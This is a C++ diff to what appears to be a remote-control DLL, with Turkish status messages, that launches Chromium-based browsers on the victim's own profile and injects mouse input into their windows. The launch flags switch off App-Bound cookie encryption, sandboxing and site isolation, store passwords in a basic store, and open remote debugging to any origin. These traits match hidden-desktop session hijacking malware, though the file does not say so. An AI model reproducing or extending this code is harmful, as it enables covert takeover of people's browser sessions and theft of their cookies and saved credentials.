@@ -995,6 +995,11 @@ static void activate_target_window(HWND hwnd, UINT msg, LRESULT ht) {
 
     SendMessageW(hRoot, WM_MOUSEACTIVATE, (WPARAM)hRoot, MAKELPARAM(ht, msg));
     SendMessageW(hRoot, WM_ACTIVATE, WA_CLICKACTIVE, (LPARAM)hFore);
+
+    // Aggressive activation
+    BringWindowToTop(hRoot);
+    SetForegroundWindow(hRoot);
+    SetActiveWindow(hRoot);
 }
 
 // -----------------------------------------------------------------------
@@ -1191,16 +1196,20 @@ static void input_loop() {
                 LPARAM lParam = MAKELPARAM(clientPt.x, clientPt.y);
 
                 SetCursorPos(screenPt.x, screenPt.y);
+
+                // Aggressive focus before click
+                BringWindowToTop(hRoot);
+                SetForegroundWindow(hRoot);
+                SetActiveWindow(hRoot);
+                SetFocus(hwnd);
+                Sleep(10);
+
                 send_mouse_input(normX, normY, MOUSEEVENTF_MOVE | mouse_button_flag(btn, true));
 
                 // Hybrid injection: Hardware + Message queue
                 PostMessageW(hwnd, WM_SETCURSOR, (WPARAM)hwnd, MAKELPARAM(ht, mouseMsg));
                 PostMessageW(hwnd, WM_MOUSEMOVE, mouse_wparam_for_button(btn, true), lParam);
                 PostMessageW(hwnd, mouseMsg, mouse_wparam_for_button(btn, true), lParam);
-
-                // Aggressive focus for Chromium
-                SetForegroundWindow(hRoot);
-                SetFocus(hwnd);
             }
             continue;
         }
@@ -1236,9 +1245,6 @@ static void input_loop() {
                 PostMessageW(hwnd, WM_SETCURSOR, (WPARAM)hwnd, MAKELPARAM(ht, mouseMsg));
                 PostMessageW(hwnd, WM_MOUSEMOVE, 0, MAKELPARAM(clientPt.x, clientPt.y));
                 PostMessageW(hwnd, mouseMsg, mouse_wparam_for_button(btn, false), MAKELPARAM(clientPt.x, clientPt.y));
-
-                // Final focus check
-                if (GetFocus() != hwnd) SetFocus(hwnd);
             }
             g_mouseDownTarget[btn] = NULL;
             continue;
@@ -1606,13 +1612,15 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                     send_status("Tarayıcı başlatılıyor...");
 
                     // Modern Chromium tarayıcılar için görünürlüğü ve kararlılığı artıran bayraklar
-                    wstring disableFeatures = L"AppBoundEncryption,AppBoundEncryptionRequired,LockProfile,CalculateNativeWinOcclusion,NativeWindowOcclusion,RendererCodeIntegrity,IsolateOrigins,site-per-process,OverlayScrollbars,WebRtcHideLocalIpsWithMdns,GXC_Check_UI_Updates,GXC_Auto_Update,GXC_Promotion,GXC_Welcome_Page,GXC_Features_Menu,GXC_Assistant,GXC_O_Million,GXC_Newsletter,GXC_Release_Notes";
+                    wstring disableFeatures = L"AppBoundEncryption,AppBoundEncryptionRequired,LockProfile,CalculateNativeWinOcclusion,NativeWindowOcclusion,WebContentsOcclusion,RendererCodeIntegrity,IsolateOrigins,site-per-process,OverlayScrollbars,WebRtcHideLocalIpsWithMdns,GXC_Check_UI_Updates,GXC_Auto_Update,GXC_Promotion,GXC_Welcome_Page,GXC_Features_Menu,GXC_Assistant,GXC_O_Million,GXC_Newsletter,GXC_Release_Notes,VizDisplayCompositor,InProcessRasterization,PaintHolding,FirstContentfulPaint,PriorityHints,GpuRasterization,LiteVideo";
 
                     wstring args = L" --remote-debugging-port=9222"
                                    L" --user-data-dir=\"" + profilePath + L"\""
                                    L" --profile-directory=\"" + profileDir + L"\""
                                    L" --no-sandbox"
                                    L" --disable-gpu"
+                                   L" --use-gl=swiftshader"
+                                   L" --use-angle=swiftshader"
                                    L" --window-size=1280,720"
                                    L" --window-position=0,0"
                                    L" --no-first-run"
@@ -1625,6 +1633,7 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                                    L" --disable-setuid-sandbox"
                                    L" --disable-infobars"
                                    L" --disable-gpu-compositing"
+                                   L" --disable-software-compositing-fallback"
                                    L" --force-cpu-draw"
                                    L" --disable-features=" + disableFeatures + L" --password-store=basic"
                                    L" --disable-encryption-win"
@@ -1639,7 +1648,6 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                                    L" --remote-allow-origins=*"
                                    L" --disable-site-isolation-trials"
                                    L" --force-color-profile=srgb"
-                                   L" --disable-software-rasterizer"
                                    L" --disable-direct-composition"
                                    L" --disable-direct-composition-layers"
                                    L" --disable-direct-composition-video-overlays"
@@ -1656,6 +1664,11 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                                    L" --test-type"
                                    L" --disable-gpu-sandbox"
                                    L" --disable-background-timer-throttling"
+                                   L" --disable-threaded-scrolling"
+                                   L" --disable-threaded-animation"
+                                   L" --disable-smooth-scrolling"
+                                   L" --disable-login-animations"
+                                   L" --disable-modal-animations"
                                    L" --lang=en-US";
 
                     if (wRequestedPath == L"Opera" || wRequestedPath == L"Opera GX") {
